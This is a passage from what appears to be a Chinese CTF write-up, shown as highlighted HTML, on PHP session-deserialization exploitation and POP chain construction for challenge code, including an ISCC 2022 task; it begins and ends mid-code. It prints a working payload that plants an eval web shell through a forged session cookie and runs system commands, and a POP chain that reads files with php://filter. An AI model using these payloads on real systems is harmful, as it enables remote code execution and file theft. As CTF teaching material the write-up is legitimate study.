punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'limti'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">></span><span class=\"token number\">5</span><span class=\"token operator\">?</span><span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"登陆失败次数超过限制\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'limit'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token function\">base64_decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'limit'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'limit'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token function\">base64_decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'limit'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n\t <span class=\"token function\">setcookie</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"limit\"</span><span class=\"token punctuation\">,</span><span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'1'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t <span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'limit'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这行里的是<code>limti</code>，它这里肯定一直是假的，所以执行的也就是<code>$_SESSION[&#39;limit&#39;]=base64_decode($_COOKIE[&#39;limit&#39;])</code>，此时我们就可以通过控制cookie中的limit，来控制session，此时我们开始构造</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token comment\">//ini_set('session.serialize_handler', 'php_serialize');</span>\n<span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">User</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$username</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$status</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">username</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$username</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">setStatus</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">status</span><span class=\"token operator\">=</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"log-\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">username</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"使用\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"登陆\"</span><span class=\"token operator\">.</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">status</span><span class=\"token operator\">?</span><span class=\"token string double-quoted-string\">\"成功\"</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"失败\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"----\"</span><span class=\"token operator\">.</span><span class=\"token function\">date_create</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token function\">format</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'Y-m-d H:i:s'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token variable\">$user</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">User</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'1.php'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'&lt;?php @eval($_POST[1]);?>'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token variable\">$user</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>得到</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">user|O:4:\"User\":3:&#123;s:8:\"username\";s:5:\"1.php\";s:8:\"password\";s:25:\"<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> @<span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span>\";s:6:\"status\";N;&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>此时php读是怎么样的呢，我们再试一下，将上方代码中的注释取消即可<br>得到</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">a:1:&#123;s:4:\"user\";O:4:\"User\":3:&#123;s:8:\"username\";s:5:\"1.php\";s:8:\"password\";s:25:\"<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> @<span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span>\";s:6:\"status\";N;&#125;&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>发现两者不同点和之前所说类似，也就是多了个前者多了|，这里呢是php来读的，此时我们想要利用session反序列化的话，那么就需要用php来写，<code>inc.php</code>是php序列化来写的，而check.php包含了inc.php，因此也是php序列化来写的，此时我们就只能利用index.php来进行session反序列化了，只有它是用php来写的，此时我们构造我们的payload如下（将中间的内容都复制下来，粘贴到1.php后）</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">a:1:&#123;s:4:\"user\";O:4:\"User\":3:&#123;s:8:\"username\";s:5:\"1.php|s:4:\"user\";O:4:\"User\":3:&#123;s:8:\"username\";s:5:\"1.php\";s:8:\"password\";s:25:\"<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> @<span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span>\";s:6:\"status\";N;&#125;\";s:8:\"password\";s:25:\"<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> @<span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span>\";s:6:\"status\";N;&#125;&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>|后面的是值，我们先将|后面的拿出来看其是否能成功序列化</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">$a='s:4:\"user\";O:4:\"User\":3:&#123;s:8:\"username\";s:5:\"1.php\";s:8:\"password\";s:25:\"<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> @<span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span>\";s:6:\"status\";N;&#125;\";s:8:\"password\";s:25:\"<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> @<span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span>\";s:6:\"status\";N;&#125;';\nvar_dump(unserialize($a));<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141545111.png\" alt=\"在这里插入图片描述\"><br>那么此时我们的思路就有了，这个是序列化文本，当php来读时后面是会自动加载的，我们只需要将序列化得到的字符串前面加个|，也就可以达到session反序列化的目的，由于有base64解码，我们这里进行base64加密即可</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">$a=|O:4:\"User\":3:&#123;s:8:\"username\";s:5:\"1.php\";s:8:\"password\";s:25:\"<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> @<span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span>\";s:6:\"status\";N;&#125;\necho base64_encode($a);<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>得到</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo1OiIxLnBocCI7czo4OiJwYXNzd29yZCI7czoyNToiPD9waHAgQGV2YWwoJF9QT1NUWzFdKTs<span class=\"token operator\">/</span>PiI7czo2OiJzdGF0dXMiO047fQ<span class=\"token operator\">==</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>此时赋值给cookie中的limit，而后再次访问index.php，此时看似是没有变化的，其实cookie已经改变，此时我们再访问一下check.php，让其进行反序列化，同时给参数u和pass赋值即可</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">u<span class=\"token operator\">=</span>quan9i<span class=\"token operator\">&amp;</span>pass<span class=\"token operator\">=</span>quan9i<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141545188.png\" alt=\"在这里插入图片描述\"></p>\n<p>此时访问<code>log-1.php</code><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141545182.png\" alt=\"在这里插入图片描述\"><br>发现注入成功，我们传值即可获取flag</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"tac flag.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141545263.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"POP链构造-1\"><a href=\"#POP链构造-1\" class=\"headerlink\" title=\"POP链构造\"></a>POP链构造</h2><p>这里以2022年ISCC的一道题来进行讲解</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'Happy New Year~ MAKE A WISH&lt;br>'</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'wish'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    @<span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'wish'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Road_is_Long</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token comment\">/***************************pop your 2022*****************************/</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Road_is_Long</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$page</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$string</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'index.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">page</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token keyword type-declaration\">string</span><span class=\"token operator\">-></span><span class=\"token property\">page</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/file|ftp|http|https|gopher|dict|\\.\\./i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">page</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"You can Not Enter 2022\"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">page</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"index.php\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Try_Work_Hard</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">protected</span>  <span class=\"token variable\">$var</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">append</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__invoke</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token function\">append</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">var</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Make_a_Change</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$effort</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">effort</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__get</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$function</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">effort</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token comment\">/**********************Try to See flag.php*****************************/</span>\n</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>思路如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">整体思路的话就是我们可以看见这个Try_Work_Hard类下<span class=\"token function\">append</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span>方法是<span class=\"token keyword\">include</span>变量的，\n我们对这个变量进行赋值就可以实现读取flag<span class=\"token operator\">.</span>php，然后这个方法需要用<span class=\"token function\">__invoke</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>来调用，\n而这个魔法方法是 当对象被当成函数来执行的时候调用，那么函数的话我们肯定就要找带括号的了，带括号的呢此时就找到了这个<span class=\"token variable\">$function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>，\n而这个是在 <span class=\"token function\">__get</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span>魔术方法里的，<span class=\"token function\">__get</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>是当访问不可访问或不存在的属性时触发，意思我们调用它不存在的一个属性，就会触发，\n此时我们看 Road_is_Long类，它有这个<span class=\"token function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>类，这个是当反序列化成功的时候触发的，我们可以看见题里面检测wish变量，当值不是空的\n时候就会进行反序列化，此时就触发了这个wakeup类，它首先是进行了过滤，它把page里的进行了过滤，如果我们此时给page赋值为对象，那它就是把\n对象当成字符串来使用了，此时我们就会调用<span class=\"token keyword type-declaration\">string</span>这个魔法函数，这个函数里是调用这个<span class=\"token keyword type-declaration\">string</span>里的page变量，这时候我们的<span class=\"token keyword type-declaration\">string</span>也是个变量，那肯定\n调用不了page呀，但我们可以给它赋值为对象，我们给<span class=\"token keyword type-declaration\">string</span>传值为这个Make_a_Change类的对象，此时我们就可以调用page了，但是这个类里没有page\n这个时候就触发了__get魔术方法，这个方法是返回这个effort的值加上<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>，而这个类有一个构造方法__construc，它是给effort赋值的，我们此时给effort\n赋值为一个Try_Work_Hard类的对象，它不就返回了<span class=\"token function\">Try_Work_Hard</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>，此时到这个类里，由于它是一个对象，被当成函数使用了，此时就触发了__involve魔术\n方法，此时就append这个<span class=\"token variable\">$var</span>变量了，而append方法是包含这个<span class=\"token variable\">$var</span>变量的，此时我们用php<span class=\"token punctuation\">:</span>filter伪协议，就实现了读取文件<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>pop链构造如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Try_Work_Hard</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">protected</span>  <span class=\"token variable\">$var</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'php://filter/read=convert.base64-encode/resource=flag.php'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">append</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__invoke</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token function\">append</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">var</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span> \n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Road_is_Long</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$page</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$string</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token keyword type-declaration\">string</span><span class=\"token operator\">-></span><span class=\"token property\">page</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/file|ftp|http|https|gopher|dict|\\.\\./i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">page</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"You can Not Enter 2022\"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">page</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"index.php\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span> \n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Make_a_Change</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$effort</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">effort</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__get</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$function</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">effort</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span> \n<span class=\"token variable\">$pop</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Road_is_Long</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$pop</span><span class=\"token operator\">-></span><span class=\"token property\">page</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Road_is_Long</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$pop</span><span class=\"token 